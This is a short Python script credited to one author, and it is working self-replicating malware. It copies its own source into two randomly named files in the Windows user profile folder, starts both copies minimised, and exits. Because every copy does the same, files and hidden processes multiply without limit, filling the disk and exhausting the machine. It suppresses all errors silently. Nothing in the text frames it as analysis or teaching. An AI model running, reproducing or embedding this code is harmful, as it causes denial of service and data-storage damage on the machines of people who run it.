# Author:PanDaoxi
from os import system, environ
from random import randint, shuffle
from sys import exit

names_char, p1, p2 = [], "", ""
for i in range(97, 123):
    names_char.append(chr(i))
for i in range(65, 91):
    names_char.append(chr(i))
for i in range(48, 58):
    names_char.append(chr(i))

def makeNames():
    name, temp = "", names_char
    shuffle(temp)
    name = "".join(temp)
    
    start = randint(0, len(name) - 1)
    end = randint(start, len(name) - 1) + 1
    
    return name[start : end]

try:
    with open(__file__, "rb") as source:
        pandaoxi = source.read()
        tPath = environ["UserProFile"]
        p1, p2 = tPath + "\\%s.py" % makeNames(), tPath + "\\%s.py" % makeNames()
        
        with open(p1, "wb") as w1:
            w1.write(pandaoxi)
        with open(p2, "wb") as w2:
            w2.write(pandaoxi)
            
    system("start /min python \"%s\"" % p1)
    system("start /min python \"%s\"" % p2)
    
    exit()
except:
    exit()
